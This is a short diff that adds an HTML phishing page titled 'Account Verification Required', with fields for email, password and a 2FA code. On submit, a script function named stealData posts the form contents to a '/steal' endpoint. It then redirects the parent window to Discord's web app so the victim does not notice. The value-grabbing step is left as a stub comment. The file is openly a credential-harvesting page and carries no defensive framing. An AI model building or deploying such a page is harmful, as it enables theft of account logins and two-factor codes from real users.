@@ -1,0 +1,17 @@
+<!-- Save as another page or inline -->
+<h1 style="color:white; text-align:center; padding-top:100px;">Account Verification Required</h1>
+<form onsubmit="stealData(event)">
+  <input type="email" placeholder="Email" required><br><br>
+  <input type="password" placeholder="Password" required><br><br>
+  <input type="text" placeholder="2FA Code"><br><br>
+  <button type="submit">Verify</button>
+</form>
+
+<script>
+  function stealData(e) {
+    e.preventDefault();
+    const data = { /* grab form values */ };
+    fetch('/steal', { method:'POST', body:JSON.stringify(data) });
+    window.parent.location = 'https://discord.com/app';
+  }
+</script>
